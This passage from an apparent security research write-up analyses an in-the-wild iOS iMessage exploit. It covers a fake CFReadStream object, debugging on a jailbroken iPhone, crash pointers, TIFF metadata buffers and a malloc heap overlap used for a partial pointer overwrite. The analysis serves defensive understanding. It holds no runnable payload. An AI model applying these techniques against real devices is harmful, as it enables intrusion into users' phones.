 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFErrorRef&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;error;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_CFStreamClient&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*client;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*info;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_CFStreamCallBacks&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*callBacks;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFLock_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;streamLock;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFArrayRef&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;previousRunloopsAndModes;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;dispatch_queue_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;queue;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Looking through the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;code it seems to call various callback functions during object destruction &amp;mdash; that seems like a very likely path towards code execution, though with some significant caveats:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Caveat I: It&amp;#39;s still unclear how an overlapping allocation in the small malloc region could lead to a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;being called on this 1MB allocation.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Caveat II: What about ASLR? There have been some tricks in the past targeting &amp;quot;universal gadgets&amp;quot; which work across multiple slides. Nemo also had &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;http://www.phrack.org/issues/69/9.html&quot;&gt;a neat objective-c trick&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;for defeating ASLR in the past, so it&amp;#39;s plausible that there&amp;#39;s something like that here.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Caveat III: What about PAC? If it&amp;#39;s a data-only attack then maybe PAC isn&amp;#39;t an issue, but if they are trying to JOP they&amp;#39;d need a trick beyond just an ASLR leak, as all forward control flow edges should be protected by PAC.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.w6e9d5pn9dq0&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Special Delivery&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Around this time in my analysis &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://x.com/helthydriver&quot;&gt;Matthias Frielingsdorf&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;offered me the use of an iPhone running 16.6, the same version as the targeted ITW victim. With Matthias&amp;#39; vulnerable iPhone, I was able to use the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://ellekit.space/dopamine/&quot;&gt;Dopamine&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;jailbreak to attach &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;lldb&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MessagesBlastDoorService&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a&lt;/span&gt;&lt;span&gt;fter a few tries was able to reproduce the exploit right up to the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFRelease&lt;/span&gt;&lt;span&gt;&amp;nbsp;call on the fake &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, confirming that that part of my analysis was correct! &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Collecting a few crashes led, yet again, to even more questions...&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.ie8yjj3vyb3y&quot;&gt;&lt;span&gt;Caveat I:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Mysterious Pointers&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Similar to the analysis of the huffman tables, there was a clear pattern in the fake object pointers, which this time were even stranger than the huffman tables. The crash site was here:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X19,#0x30]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X8,#0x58]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;At this point &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X19&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to the fake &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, and collecting a few &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X19&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;values there&amp;#39;s a pretty clear pattern:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x000000075f000010&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x0000000d4f000010&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The fake object is inside a 1MB heap allocation, but all those fake object addresses are always 16 bytes above a 16MB-aligned address. It seemed really strange to me to end up with a pointer 0x10 bytes past such a round number. What kind of construct would lead to the creation of such a pointer? Even though I did have a debugger attached to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MessagesBlastDoorService&lt;/span&gt;&lt;span&gt;, it wasn&amp;#39;t a time-travel debugger, so figuring out the history of such a pointer was non-trivial. Using the same core dump analysis techniques I could see that the pointer which would end up in &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X19&lt;/span&gt;&lt;span&gt;&amp;nbsp;was also present in the backing buffer of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFSet&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;described earlier. But how did it get there?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Having found the strange &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;inside the TIFF I was heavily biased towards believing that this must have something to do with it, so I wrote some tooling to modify the fake &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;&amp;#39;s in the TIFF in the exploit. The theory was that by messing with that &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;, I could cause a crash when it was used and figure out what was going on. But making minor changes to the strip buffer didn&amp;#39;t seem to have any effect &amp;mdash; the exploit still worked! Even replacing the entire strip buffer with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;#39;s didn&amp;#39;t stop the exploit working... What&amp;#39;s going on?&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.du8xlqhnw8z7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Stepping back&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I had made a list of the primitives I thought might lead to the creation of such a strange looking pointer &amp;mdash; first on the list was a partial pointer overwrite. But then why the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;? But now having shown that the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;can&amp;#39;t be involved, it was time to go back to the list. And step back even further and make sure I&amp;#39;d really looked at all of that TIFF...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;There were still those four other metadata buffers in the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;tiffdump&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;output I&amp;#39;d shown earlier:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;700 (0x2bc) BYTE (1) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;33723 (0x83bb) UNDEFINED (7) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;34377 (0x8649) BYTE (1) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;ICC Profile (34675) UNDEFINED (7) 15347&amp;lt;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...&amp;gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;I&amp;#39;d just dismissed them, but, maybe I shouldn&amp;#39;t have done that? I had actually already dumped the full contents of each of those buffers and checked that there wasn&amp;#39;t something else apart from the zeros. They were all zeros, except the third-to-last bytes which were 0x10, which I&amp;#39;d considered completely uninteresting. Uninteresting, unless you wanted to partially overwrite the three least-significant bytes of a little-endian pointer value with 0x000010 that is!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Let&amp;#39;s look back at the SMALL metadata:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000058: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23 XQFzMDWmii-c15&quot;&gt;0x0007&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c23 XQFzMDWmii-c19&quot;&gt;0x8027&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c19&quot;&gt;&amp;nbsp;0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c13&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0018 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000068: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000078: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000088: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c32&quot;&gt;0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c33&quot;&gt;0x0003 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c14 XQFzMDWmii-c21&quot;&gt;0x001c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000098: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c23 XQFzMDWmii-c14&quot;&gt;0x8027&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Each of those four metadata buffers in the TIFF is &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;15347&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes, which is &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3bf3&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;mdash; looked at another way that&amp;#39;s &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3c00&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the size rounded up to the next &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x200&lt;/span&gt;&lt;span&gt;&amp;nbsp;block size), minus &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;5&lt;/span&gt;&lt;span&gt;, minus &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3c00&lt;/span&gt;&lt;span&gt;&amp;nbsp;is exactly 30 &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x200&lt;/span&gt;&lt;span&gt;&amp;nbsp;byte blocks. Each 16-bit word in the metadata array shown above corresponds to one &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x200&lt;/span&gt;&lt;span&gt;&amp;nbsp;block, where the overlapping chunk in yellow starts at &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x14800005a&lt;/span&gt;&lt;span&gt;. Counting forwards 30 chunks means that the end of a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3c00&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;allocation overlaps perfectly with the end of the original blue three-chunk allocation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000058: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23 XQFzMDWmii-c15&quot;&gt;0x0007&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c23&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c23 XQFzMDWmii-c19 XQFzMDWmii-c24&quot;&gt;0x8027&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c19 XQFzMDWmii-c24&quot;&gt;&amp;nbsp;0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c24&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c16 XQFzMDWmii-c9 XQFzMDWmii-c26&quot;&gt;0x0018 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000068: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c26 XQFzMDWmii-c13 XQFzMDWmii-c16 XQFzMDWmii-c9&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000078: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c26 XQFzMDWmii-c13 XQFzMDWmii-c16 XQFzMDWmii-c9&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000088: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c16&quot;&gt;0x0000 0x0000 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c24&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c24 XQFzMDWmii-c33&quot;&gt;0x0003 0x0000 0x0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c21 XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x001c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c11&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x148000098: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c9 XQFzMDWmii-c14&quot;&gt;0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c13 XQFzMDWmii-c23 XQFzMDWmii-c14&quot;&gt;0x8027&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
